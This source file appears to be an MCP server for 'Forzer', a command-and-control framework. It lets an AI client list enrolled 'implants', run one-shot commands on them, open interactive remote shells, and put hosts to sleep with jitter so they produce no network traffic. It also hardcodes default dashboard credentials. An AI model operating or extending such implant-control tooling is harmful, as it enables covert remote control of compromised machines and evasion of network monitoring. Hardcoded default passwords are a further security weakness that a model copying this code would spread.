'use strict';

/*
 * Forzer MCP server (stdio, JSON-RPC 2.0, zero dependencies).
 *
 * Exposes the control-plane as MCP tools so a client (or the agent dev)
 * can drive it "for real" against a live server + agent:
 *   - list_peers      : enrolled implants
 *   - run_command     : one-shot command on a peer (returns rc + output)
 *   - terminal_start  : open an interactive shell session on a peer
 *   - terminal_input  : send keystrokes / Ctrl-C to a session
 *   - terminal_read   : read buffered terminal output for a session
 *   - terminal_end    : close a session
 *
 * Usage: node mcp-server.js   (env: FORZER_MCP_URL, FORZER_MCP_USER/PASS)
 */

/* No `ws` here: Node 22+ provides a WHATWG WebSocket client as a global. */
const readline = require('readline');

const CTRL_URL = process.env.FORZER_MCP_URL ||
  (process.env.FORZER_SERVER ? process.env.FORZER_SERVER.replace(/\/$/, '') : 'ws://127.0.0.1:3000');
const DASH_USER = process.env.FORZER_MCP_USER || process.env.DASH_USER || 'Forgot';
const DASH_PASS = process.env.FORZER_MCP_PASS || process.env.DASH_PASS || 'HelloWorld1!';

let ws = null;
let viewerId = null;
let peers = [];
let reqId = 0;
let pending = {};            // request id -> {resolve, reject, timer}
const termBuffers = {};      // session id -> string
const termExit = {};         // session id -> rc
const termPeer = {};         // session id -> peer id
// A terminal that nobody reads would grow without bound; keep the tail only.
const MAX_TERM_BUF = 1 << 20;
const RECONNECT_MS = 2000;
let reconnecting = false;

function wsOpen() {
  return !!ws && ws.readyState === WebSocket.OPEN;
}

function failAllPending(err) {
  for (const id of Object.keys(pending)) {
    const p = pending[id];
    if (!p) continue;
    clearTimeout(p.timer);
    delete pending[id];
    p.reject(err);
  }
}

/* The control plane can restart at any time (Render free tier does it often).
   Without this the process stayed alive on a dead socket, served a frozen peer
   list forever, and every run_command silently timed out. */
function scheduleReconnect() {
  if (reconnecting) return;
  reconnecting = true;
  setTimeout(reconnect, RECONNECT_MS);
}

async function reconnect() {
  reconnecting = false;
  try {
    await connect();
    process.stderr.write('forzer-mcp: reconnected to the control plane\n');
  } catch (e) {
    scheduleReconnect();
  }
}

function connect() {
  return new Promise((resolve, reject) => {
    const url = CTRL_URL.replace(/^http/, 'ws');
    const sock = new WebSocket(url);
    ws = sock;
    let settled = false;
    const fail = (e) => { if (!settled) { settled = true; reject(e); } };
    sock.addEventListener('open', () => {
      sock.send(JSON.stringify({ type: 'dashboard', user: DASH_USER, pass: DASH_PASS }));
    });
    /* Built-in WebSocket delivers a MessageEvent; the `ws` package delivered the
       raw payload. `error` arrives as an Event, so re-wrap it rather than
       rejecting with something that has no message. */
    sock.addEventListener('message', (ev) => {
      let msg;
      try { msg = JSON.parse(ev.data); } catch { return; }
      if (!msg || typeof msg !== 'object') return;
      if (msg.type === 'dashboard-ready') {
        viewerId = msg.id;
        if (!settled) { settled = true; resolve(); }
      } else if (msg.type === 'dashboard-auth' && !msg.ok) {
        fail(new Error(msg.error || 'auth failed'));
      } else if (msg.type === 'implants' || msg.type === 'map') {
        /* `implants` is current; `map` is the pre-identity frame type. */
        peers = msg.implants || msg.peers || [];
      } else if (msg.type === 'command-result' || msg.type === 'cancel-result') {
        const p = pending[msg.id];
        if (p) { clearTimeout(p.timer); delete pending[msg.id]; p.resolve(msg); }
      }
      else if (msg.type === 'command-error') {
        const p = pending[msg.id];
        if (p) { clearTimeout(p.timer); delete pending[msg.id]; p.reject(new Error(msg.error || 'command failed')); }
      }
      else if (msg.type === 'term-data' && msg.id) {
        const add = msg.data ? Buffer.from(msg.data, 'base64').toString() : '';
        const cur = (termBuffers[msg.id] || '') + add;
        termBuffers[msg.id] = cur.length > MAX_TERM_BUF ? cur.slice(-MAX_TERM_BUF) : cur;
      }
      else if (msg.type === 'term-exit' && msg.id) {
        termExit[msg.id] = msg.rc === undefined ? -1 : msg.rc;
      }
    });
    sock.addEventListener('error', () => fail(new Error('websocket error')));
    sock.addEventListener('close', () => {
      if (ws === sock) ws = null;
      failAllPending(new Error('control plane connection lost'));
      scheduleReconnect();
    });
  });
}

function send(obj, timeoutMs = 15000) {
  return new Promise((resolve, reject) => {
    if (!wsOpen()) {
      reject(new Error('not connected to the control plane'));
      return;
    }
    const id = 'm' + (++reqId);
    const timer = setTimeout(() => { delete pending[id]; reject(new Error('timeout')); }, timeoutMs);
    pending[id] = { resolve, reject, timer };
    obj.id = id;
    ws.send(JSON.stringify(obj));
  });
}

function sendNow(obj) {
  if (!wsOpen()) throw new Error('not connected to the control plane');
  ws.send(JSON.stringify(obj));
}

function peerIdByNameOrId(ref) {
  if (!ref) return null;
  const p = peers.find((x) => x.id === ref || x.name === ref);
  return p ? p.id : ref;
}

/* --------------------------- MCP protocol --------------------------- */

const TOOLS = [
  {
    name: 'list_peers',
    description: 'List enrolled implants (id, name, online state, last seen). Reports whether the control-plane link is live.',
    inputSchema: { type: 'object', properties: {} },
  },
  {
    name: 'run_command',
    description: 'Run a one-shot command on a peer and return its output + exit code.',
    inputSchema: {
      type: 'object',
      properties: {
        peer: { type: 'string', description: 'peer id or name' },
        command: { type: 'string', description: 'command line to run' },
      },
      required: ['peer', 'command'],
    },
  },
  {
    name: 'terminal_start',
    description: 'Open an interactive shell session on a peer.',
    inputSchema: {
      type: 'object',
      properties: { peer: { type: 'string' }, session: { type: 'string', description: 'optional session id' } },
      required: ['peer'],
    },
  },
  {
    name: 'terminal_input',
    description: 'Send keystrokes (or "\\u0003" for Ctrl-C) to a terminal session.',
    inputSchema: {
      type: 'object',
      properties: { session: { type: 'string' }, data: { type: 'string' } },
      required: ['session', 'data'],
    },
  },
  {
    name: 'terminal_read',
    description: 'Read (and clear) buffered output of a terminal session.',
    inputSchema: { type: 'object', properties: { session: { type: 'string' } }, required: ['session'] },
  },
  {
    name: 'terminal_end',
    description: 'Close a terminal session.',
    inputSchema: { type: 'object', properties: { session: { type: 'string' } }, required: ['session'] },
  },
  {
    name: 'cancel_command',
    description: 'Stop the command a peer is currently running. The peer runs one command at a time, ' +
      'so there is nothing to name. Returns "cancelled" or "nothing was running"; the killed ' +
      "command's own result still arrives separately with rc=124. Does not affect terminal sessions " +
      '— use terminal_end for those.',
    inputSchema: {
      type: 'object',
      properties: { peer: { type: 'string', description: 'peer id or name' } },
      required: ['peer'],
    },
  },
  {
    name: 'sleep_peer',
    description: 'Tell a peer to disconnect and stay off the network for a while, then check back in. ' +
      'Use this to make an idle host generate no traffic at all. Fire-and-forget: nothing is returned, ' +
      'and the peer shows as offline until it wakes. The server caps this at one hour.',
    inputSchema: {
      type: 'object',
      properties: {
        peer: { type: 'string', description: 'peer id or name' },
        seconds: { type: 'number', description: 'how long to stay quiet (0-3600, default 900)' },
      },
      required: ['peer'],
    },
  },
];

function callTool(name, args) {
  switch (name) {
    case 'list_peers': {
      // Say so when the link is down, instead of reporting a stale empty mesh.
      const text = JSON.stringify({ connected: wsOpen(), peers }, null, 2);
      return { content: [{ type: 'text', text }] };
    }
    case 'run_command': {
      const to = peerIdByNameOrId(args.peer);
      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
      // `send` assigns the request id; no need to pre-generate one.
      return send({ type: 'command', to, data: args.command }).then((m) => ({
        content: [{ type: 'text', text: `rc=${m.rc}\n${m.data || ''}` }],
      }));
    }
    case 'terminal_start': {
      const to = peerIdByNameOrId(args.peer);
      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
      const session = args.session || ('s' + (++reqId));
      termBuffers[session] = '';
      delete termExit[session];
      // Remember which host the session lives on. The control plane reads a
      // missing `to` as "the first peer", so input used to land on whichever
      // machine happened to register first rather than the one we opened.
      termPeer[session] = to;
      try {
        sendNow({ type: 'term-start', to, id: session });
      } catch (e) {
        delete termPeer[session];
        return { content: [{ type: 'text', text: e.message }], isError: true };
      }
      return { content: [{ type: 'text', text: `session ${session} started on ${to}` }] };
    }
    case 'cancel_command': {
      const to = peerIdByNameOrId(args.peer);
      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
      return send({ type: 'cancel', to }).then((m) => ({
        content: [{ type: 'text', text: m.rc === 0 ? 'cancelled' : 'nothing was running' }],
      }));
    }
    case 'sleep_peer': {
      const to = peerIdByNameOrId(args.peer);
      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
      const secs = args.seconds === undefined ? 900 : Number(args.seconds);
      if (!Number.isFinite(secs) || secs < 0 || secs > 3600) {
        return { content: [{ type: 'text', text: 'seconds must be between 0 and 3600' }], isError: true };
      }
      try {
        sendNow({ type: 'sleep', to, ms: Math.round(secs * 1000) });
      } catch (e) {
        return { content: [{ type: 'text', text: e.message }], isError: true };
      }
      return { content: [{ type: 'text',
        text: `${to} will disconnect now and check back in about ${Math.round(secs / 60) || '<1'} min (plus jitter)` }] };
    }
    case 'terminal_input': {
      const to = termPeer[args.session];
      if (!to) return { content: [{ type: 'text', text: 'unknown session — call terminal_start first' }], isError: true };
      const b64 = Buffer.from(args.data, 'binary').toString('base64');
      try {
        sendNow({ type: 'term-input', to, id: args.session, data: b64 });
      } catch (e) {
        return { content: [{ type: 'text', text: e.message }], isError: true };
      }
      return { content: [{ type: 'text', text: 'sent' }] };
    }
    case 'terminal_read': {
      const out = termBuffers[args.session] || '';
      termBuffers[args.session] = '';
      const exited = args.session in termExit ? `(exited rc=${termExit[args.session]})` : '';
      return { content: [{ type: 'text', text: out + exited }] };
    }
    case 'terminal_end': {
      const to = termPeer[args.session];
      if (to) {
        try { sendNow({ type: 'term-end', to, id: args.session }); } catch (e) { /* session is gone anyway */ }
      }
      delete termPeer[args.session];
      delete termBuffers[args.session];
      delete termExit[args.session];
      return { content: [{ type: 'text', text: 'ended' }] };
    }
    default:
      return { content: [{ type: 'text', text: `unknown tool ${name}` }], isError: true };
  }
}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: false });

/* The stdio transport is newline-delimited JSON: one object per line. The old
   code concatenated lines into a buffer that was only cleared on a *successful*
   parse, so one malformed line wedged the server permanently and it answered
   nothing for the rest of the session. */
rl.on('line', (line) => {
  const s = line.trim();
  if (!s) return;
  let msg;
  try {
    msg = JSON.parse(s);
  } catch {
    process.stderr.write('forzer-mcp: ignoring unparseable line: ' + s.slice(0, 120) + '\n');
    return;
  }
  if (!msg || typeof msg !== 'object' || Array.isArray(msg)) return;
  handle(msg);
});

function respond(id, result, error) {
  const o = { jsonrpc: '2.0', id };
  if (error) o.error = error; else o.result = result;
  process.stdout.write(JSON.stringify(o) + '\n');
}

async function handle(msg) {
  try {
    if (msg.method === 'initialize') {
      respond(msg.id, {
        protocolVersion: '2024-11-05',
        capabilities: { tools: {} },
        serverInfo: { name: 'forzer-mcp', version: '0.1.0' },
      });
    } else if (msg.method === 'tools/list') {
      respond(msg.id, { tools: TOOLS });
    } else if (msg.method === 'tools/call') {
      const res = await callTool(msg.params.name, msg.params.arguments || {});
      respond(msg.id, res);
    } else if (msg.method === 'notifications/initialized' || msg.method === 'ping') {
      // no response required
    } else {
      respond(msg.id, null, { code: -32601, message: 'method not found' });
    }
  } catch (e) {
    respond(msg.id, null, { code: -32603, message: e.message });
  }
}

connect().then(() => {
  // ready; stdin loop already running
}).catch((e) => {
  process.stderr.write('mcp connect error: ' + e.message + '\n');
  process.exit(1);
});
